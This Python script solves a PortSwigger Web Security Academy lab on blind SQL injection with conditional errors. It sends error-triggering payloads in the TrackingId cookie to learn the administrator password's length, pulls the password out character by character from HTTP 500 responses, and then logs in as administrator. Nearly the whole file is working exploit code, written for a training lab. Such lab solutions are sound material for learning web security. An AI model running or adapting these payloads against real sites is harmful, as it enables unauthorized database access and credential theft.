# Blind SQL injection with conditional errors

# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_payload(s, url, tracking_cookie, payload):
	cookies = {"TrackingId": tracking_cookie + payload}
	r = s.get(url, cookies=cookies)
	time.sleep(.3)
	print('[+] Using payload:\t%s' % payload)
	return r

def get_password_length(s, url, tracking_cookie):
	for i in range(1, 30):
		length_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>%s) || ' " % i
		r = send_payload(s, url, tracking_cookie, length_payload)
		if r.status_code != 500:
			return i
	return False

def get_admin_password(s, url, tracking_cookie, pass_len):
	admin_password = ""
	for i in range(1, pass_len + 1):
		for j in range(32, 126):
			password_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and ascii(substr(password,%s,1))='%s') || '--" % (i, j)
			if i == 1 and j == 32:
				r = send_payload(s, url, tracking_cookie, password_payload)
				print('\n')
			else:
				cookies = {"TrackingId": tracking_cookie + password_payload}
				r = s.get(url, cookies=cookies)
			if r.status_code != 500:
				sys.stdout.write("\rAdmin's password:\t" + '*' * len(admin_password) + chr(j))
				sys.stdout.flush()
			else:
				admin_password += chr(j)
				sys.stdout.write("\rAdmin's password:\t" + '*' * len(admin_password))
				sys.stdout.flush()
				break
	return admin_password

def admin_login(s, url, password):
	print('\n[+] Trying to login as Administrator with found credentials...\n')
	login_path = url + '/login'
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	username = "administrator"
	login_data = {"username": username, "password": password, "csrf": csrf_token}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	res = r.text
	if 'Your username is: administrator' in res:
		return r.text
	else:
		return False


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Blind SQL injection with conditional errors')
	parser = argparse.ArgumentParser(description="[+] Lab: Blind SQL injection with conditional errors")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print("\n[+] Determining the length of administrator's password...")
			tracking_cookie = s.cookies.get_dict().get('TrackingId')
			pass_len = get_password_length(s, url, tracking_cookie)
			if pass_len:
				print("\n[+] Administrator's password is %s characters long !" % pass_len)
				print("[+] Trying to retrieve administrator's password...\n")
				admin_password = get_admin_password(s, url, tracking_cookie, pass_len)
				if admin_password:
					print("\n\n[+] Found administrator's password:\t%s" % admin_password)
					logged_in = admin_login(s, url, admin_password)
					if logged_in:
						print("\n[+] Successfully logged in with administrator's password...\n")
						time.sleep(5)
						s.cookies.clear()
						s.headers.clear()
						r = s.get(url)
						if 'Congratulations, you solved the lab!' in r.text:
							print('[+] The lab is solved !')
					else:
						print('\n[-] Exploit Failed to log in as Administrator <!>')
				else:
					print('\n[-] Exploit Failed to retrieve the password <!>')
			else:	
				print('\n[-] Exploit Failed to retrieve the password length <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()